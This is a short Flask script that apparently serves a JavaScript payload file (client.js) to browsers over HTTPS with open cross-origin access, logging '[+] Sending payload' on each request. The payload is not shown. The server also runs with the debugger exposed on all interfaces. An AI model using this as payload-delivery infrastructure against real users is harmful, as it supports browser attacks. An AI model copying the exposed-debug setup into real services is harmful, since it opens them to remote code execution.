from flask import Flask, request, send_file
from flask_cors import CORS
from db import create_connection, create_db # insert_content

app = Flask(__name__)
CORS(app)
database = r"./database/sqlite.db"

@app.route("/client.js", methods=["GET"])
def clientjs():
    print("[+] Sending payload")
    return send_file("./client.js", attachment_filename="client.js")


app.run(debug=True, host="0.0.0.0", port=443, ssl_context=("cert.perm", "key.perm"))
